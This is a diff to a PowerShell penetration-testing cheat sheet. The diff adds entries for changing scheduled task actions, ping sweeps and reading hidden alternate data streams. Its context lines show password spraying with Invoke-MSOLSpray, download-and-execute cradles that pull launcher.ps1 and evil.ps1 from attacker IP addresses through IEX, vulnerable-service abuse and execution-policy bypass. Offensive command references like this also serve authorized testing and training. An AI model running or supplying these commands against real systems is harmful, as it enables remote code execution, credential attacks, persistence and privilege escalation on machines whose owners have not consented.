@@ -1,5 +1,4 @@
-#### List all services that do not run as a standard account
-Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\* | Where-Object {($_.ObjectName -notlike 'NT Authority\*') -and ($_.ObjectName -ne $null) -and ($_.ObjectName -ne "LocalSystem")}
+# PowerShell
 
 ## Comparison Operators
 ------
@@ -49,8 +48,10 @@ Invoke-MSOLSpray -Userlist ./users.txt -Password "Spring2020"
 
 ## WMIC
 ------
-#### List Scheduled Tasks
-
+#### List Scheduled Tasks with Actions
+`Get-ScheduledTask | %{"$($_.TaskName) : $($_.Actions.Execute) $($_.Actions.Arguments)"}`
+#### Change Scheduled Task Action
+Set-ScheduledTask MYTASK -Action $(New-ScheduledTaskAction -Action "C:\path\file.exe")
 #### Raw WMIC Query
 Get-CimInstance -Query "SELECT * from Win32_Process WHERE name LIKE 'P%'"
 #### Get AVs Installed
@@ -161,6 +162,9 @@ Invoke-Expression
 powershell -Command "$ip='http://A.B.C.D:22/launcher.ps1; IEX (New-Object Net.webclient).DownloadString($ip)"
 #### Run remote HTA (in-memory)
 
+#### Run a Ping Sweep
+1..22 | % {"10.2.3.$($_): $(Test-Connection -count 1 -comp 10.2.3.$($_) -quiet)"}
+
 #### Invoke Vulnerable Service
 Install-ServiceBinary -ServiceName 'VulnSVC'
 #### 
@@ -229,8 +233,13 @@ Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$\_.AccessToString -matc
 
 #### Set System Environment Variables
 \[System.Environment\]::SetEnvironmentVariable($varName, $varValue, [System.EnvironmentVariableTarget]::Machine)
-
-
+#### Make a DNS Request
+`[System.Net.Dns]::Resolve('foo.com')`
+#### List Alternate Data Streams
+Get-Item -Path C:\\path\\to\\foo.txt -Stream *
+Get-Item -Path C:\\path\\to\\foo.txt -Stream * | ?{$_.Stream -ne ':$DATA'} | %{$_.Stream}
+#### Read Alternate Data Streams
+Get-Item -Path C:\\path\\to\\foo.txt -Stream myhiddenstream
 
 ## AD
 ------
@@ -270,3 +279,6 @@ powershell.exe -ExecutionPolicy bypass
 #### Download and Execute
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.206:6666/evil.ps1')
 IEX ( iwr ''http://192.168.56.206:6666/evil.ps1")
+
+#### List all services that do not run as a standard account
+Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\* | Where-Object {($_.ObjectName -notlike 'NT Authority\*') -and ($_.ObjectName -ne $null) -and ($_.ObjectName -ne "LocalSystem")}
